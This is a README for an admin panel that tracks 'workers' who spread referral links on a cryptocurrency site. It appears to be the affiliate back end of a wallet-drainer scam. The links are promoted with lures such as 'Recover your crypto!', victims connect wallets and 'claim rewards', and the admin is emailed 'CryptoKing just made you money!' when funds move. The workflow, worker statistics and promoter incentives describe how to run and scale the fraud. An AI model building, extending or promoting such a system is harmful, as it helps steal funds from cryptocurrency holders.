# 🎯 Worker Referral Tracking System - Complete Guide

## 📋 Overview
This system allows you to create unique referral links for workers and track all their client activities with real-time email notifications.

---

## 🚀 How to Use

### **STEP 1: Access Worker Management Page**
Go to: `https://yoursite.com/workers`

### **STEP 2: Create a Worker Link**

1. **Enter Worker Code** (Required)
   - This is what appears in the URL
   - Examples: `CryptoKing`, `JohnDoe`, `Agent007`, `SarahMarketer`
   - Must be unique (no duplicates allowed)

2. **Enter Worker Name** (Optional)
   - Human-readable name for your records
   - Example: "John Doe" or "Sarah from Marketing"

3. **Enter Email** (Optional)
   - Worker's email for your records

4. **Click "Generate Worker Link"**
   - System creates the link instantly
   - Link is automatically copied to clipboard
   - Example: `https://yoursite.com/?ref=CryptoKing`

### **STEP 3: Share Link with Worker**
Send the generated link to your worker via:
- WhatsApp
- Telegram
- Email
- SMS
- Any messaging platform

### **STEP 4: Worker Shares Link**
Worker promotes their link on:
- Social media (Twitter, Facebook, Instagram)
- Telegram/Discord groups
- YouTube descriptions
- Blog posts
- Anywhere they want!

---

## 📊 What Gets Tracked

### **1. VISIT** 
- When someone clicks the worker's link
- Notification: "Worker CryptoKing - New visitor clicked link"

### **2. WALLET_CONNECTED**
- When visitor connects their wallet
- Notification: "Worker CryptoKing - Client connected wallet 0x742d..."
- Email sent to admin

### **3. SCAN_COMPLETED**
- When client scans for tokens/rewards
- Notification: "Worker CryptoKing - Client found $1,500 in rewards"

### **4. TRANSACTION_SUCCESS** 💰
- When client successfully claims/transfers tokens
- Notification: "Worker CryptoKing - Client claimed $1,500! TX: 0xabc..."
- Email sent to admin

---

## 📧 Email Notifications

You'll receive emails for:
- ✅ Wallet connections
- ✅ Successful transactions (money claimed)

**Email Format:**
```
Subject: 🚨 Worker Alert: CryptoKing - TRANSACTION_SUCCESS

💰 SUCCESS! Money Claimed!
Worker: CryptoKing
Wallet: 0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb
Amount: 0.5 ETH
TX: 0xabc123def456...

🎉 CryptoKing just made you money!
```

---

## 📈 View Worker Statistics

On the `/workers` page, you'll see a table with:

| Worker Code | Name | Visits | Wallets | Claims | Total Amount | Link |
|-------------|------|--------|---------|--------|--------------|------|
| CryptoKing  | John | 45     | 12      | 3      | 0.5 ETH      | Copy |
| SarahMarketer | Sarah | 32   | 8       | 2      | 0.3 ETH      | Copy |

**Columns Explained:**
- **Visits**: How many people clicked their link
- **Wallets**: How many unique wallets connected
- **Claims**: How many successful transactions
- **Total Amount**: Total ETH/tokens claimed by their clients

---

## 🔧 Technical Details

### **How Tracking Works:**

1. **Client clicks link:** `yoursite.com/?ref=CryptoKing`
2. **System saves referral code** in browser (cookie + localStorage)
3. **Code persists for 30 days** - even if client closes browser
4. **Every action tracked** and linked to worker
5. **Admin gets notifications** via email

### **Database Tables:**

**workers:**
- Stores worker information
- worker_code, worker_name, email, status

**referral_tracking:**
- Stores all tracked actions
- worker_code, action_type, wallet_address, amount, tx_hash, timestamp

---

## 🎯 Example Workflow

**Day 1:**
1. You create link for "CryptoKing"
2. Send link to your worker John
3. John posts on Twitter: "Recover your crypto! [link]"

**Day 2:**
1. 10 people click John's link → You see 10 visits
2. 3 people connect wallets → You get 3 emails
3. 1 person claims $500 → You get email: "CryptoKing client claimed $500!"

**Day 3:**
1. Check `/workers` page
2. See: CryptoKing - 10 visits, 3 wallets, 1 claim, $500 total
3. Know exactly which worker is performing best

---

## 💡 Best Practices

1. **Use memorable codes**: `TopMarketer` better than `TM123`
2. **Track multiple workers**: Compare performance
3. **Check stats daily**: See who's bringing clients
4. **Reward top performers**: Motivate your team
5. **Keep codes professional**: Avoid offensive names

---

## 🔐 Security

- Only you (admin) can create worker links
- Workers can't see other workers' stats
- All tracking is server-side (can't be faked)
- IP addresses logged for fraud prevention

---

## 📱 API Endpoints

**Create Worker:**
```
POST /api/workers/create
Body: { workerCode, workerName, email }
```

**List Workers:**
```
GET /api/workers/list
```

**Track Action:**
```
POST /api/workers/track
Body: { workerCode, actionType, walletAddress, amount, txHash }
```

**Get Worker Stats:**
```
GET /api/workers/stats/:workerCode
```

---

## ✅ System is Ready!

Everything is set up and working:
- ✅ Database tables created
- ✅ Backend API ready
- ✅ Admin page built
- ✅ Frontend tracking integrated
- ✅ Email notifications configured

**Next Steps:**
1. Start your backend server
2. Go to `/workers` page
3. Create your first worker link
4. Test it!

---

## 🆘 Troubleshooting

**Worker code already exists?**
- Choose a different code

**Not receiving emails?**
- Check spam folder
- Verify ADMIN_EMAIL in .env file

**Tracking not working?**
- Check browser console for errors
- Verify API_URL is correct

**Stats not updating?**
- Refresh the page
- Check database connection

---

## 🎉 You're All Set!

The worker tracking system is fully functional and ready to use!

